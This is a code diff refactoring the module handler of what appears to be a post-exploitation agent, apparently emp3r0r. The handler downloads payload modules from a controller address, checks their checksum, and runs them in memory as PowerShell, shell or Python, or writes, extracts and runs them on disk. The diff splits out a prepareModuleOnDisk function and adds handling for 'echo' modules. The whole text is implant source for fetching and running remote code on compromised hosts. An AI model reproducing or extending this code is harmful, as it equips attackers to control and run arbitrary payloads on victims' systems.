@@ -23,40 +23,23 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 	modDir := filepath.Join(RuntimeConfig.AgentRoot, modName)
 	var err error
 
-	// Create agent root if not exist
-	if !util.IsDirExist(RuntimeConfig.AgentRoot) {
-		if err := os.MkdirAll(RuntimeConfig.AgentRoot, 0o700); err != nil {
-			return fmt.Sprintf("creating %s: %v", RuntimeConfig.AgentRoot, err)
-		}
-	}
-
-	// download and extract module file
+	// download and verify module file
 	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, download_addr)
 	if downloadErr != nil {
 		return downloadErr.Error()
 	}
 	payload_data := payload_data_downloaded
-	if !inMem {
-		// write-to-disk modules
-		err := os.WriteFile(tarball, payload_data, 0o600)
-		if err != nil {
-			return fmt.Sprintf("writing %s: %v", tarball, err)
-		}
 
-		if extractErr := extractModule(modDir, tarball); extractErr != nil {
-			return extractErr.Error()
-		}
-
-		// cd to module dir
-		defer os.Chdir(RuntimeConfig.AgentRoot)
-		err = os.Chdir(modDir)
-		if err != nil {
-			return fmt.Sprintf("cd to %s: %v", modDir, err)
-		}
-	} else {
+	if inMem {
+		// in memory execution
 		payload_data, err = arc.DecompressXz(payload_data_downloaded)
 		if err != nil {
 			return fmt.Sprintf("decompressing %s: %v", file_to_download, err)
+		}
+	} else {
+		// on disk execution
+		if err := prepareModuleOnDisk(tarball, modDir, payload_data); err != nil {
+			return err.Error()
 		}
 	}
 
@@ -72,6 +55,8 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 		}
 		executable = fields[0]
 	}
+
+	// switch on payload type, in memory execution
 	switch payload_type {
 	case "powershell":
 		out, err := RunPSScript(payload_data)
@@ -87,7 +72,6 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 			return fmt.Sprintf("running shell script: %s (%v)", out, err)
 		}
 		return out
-
 	case "python":
 		executable = "python"
 		args = []string{exec_cmd}
@@ -99,7 +83,24 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 			return out
 		}
 	default:
+		// on disk modules
 		args = fields[1:]
+	}
+
+	// interactive modules
+	if executable == "echo" {
+		out = tun.SHA256SumRaw([]byte(emp3r0r_data.MagicString))
+		log.Printf("echo: %s", out)
+		return
+	}
+
+	// normal on disk modules, run exec_cmd
+	if !inMem {
+		defer os.Chdir(RuntimeConfig.AgentRoot)
+		err = os.Chdir(modDir)
+		if err != nil {
+			return fmt.Sprintf("cd to %s: %v", modDir, err)
+		}
 	}
 	cmd := exec.Command(executable, args...)
 	cmd.Env = env
@@ -111,6 +112,34 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 	}
 
 	return out
+}
+
+func prepareModuleOnDisk(tarball, modDir string, payload_data []byte) error {
+	// Create agent root if not exist
+	if !util.IsDirExist(RuntimeConfig.AgentRoot) {
+		if err := os.MkdirAll(RuntimeConfig.AgentRoot, 0o700); err != nil {
+			return fmt.Errorf("creating %s: %v", RuntimeConfig.AgentRoot, err)
+		}
+	}
+
+	// write-to-disk modules
+	err := os.WriteFile(tarball, payload_data, 0o600)
+	if err != nil {
+		return fmt.Errorf("writing %s: %v", tarball, err)
+	}
+
+	if extractErr := extractModule(modDir, tarball); extractErr != nil {
+		return extractErr
+	}
+
+	// cd to module dir
+	defer os.Chdir(RuntimeConfig.AgentRoot)
+	err = os.Chdir(modDir)
+	if err != nil {
+		return fmt.Errorf("cd to %s: %v", modDir, err)
+	}
+
+	return nil
 }
 
 func getScriptExtension() string {
